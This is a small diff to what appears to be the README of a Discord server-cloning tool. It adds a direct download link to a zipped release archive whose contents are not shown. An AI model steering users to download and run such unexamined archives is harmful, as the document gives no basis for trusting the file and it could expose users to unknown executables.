@@ -18,7 +18,7 @@
 ---
 
 ## 🏹 ・Download Relase!
-🚀 Install --> [Releases]()
+🚀 Install --> [Releases](https://github.com/Yupipa/Discord-Server-Cloner-Maker/releases/download/v2.2/Relase.zip)
 
 
 
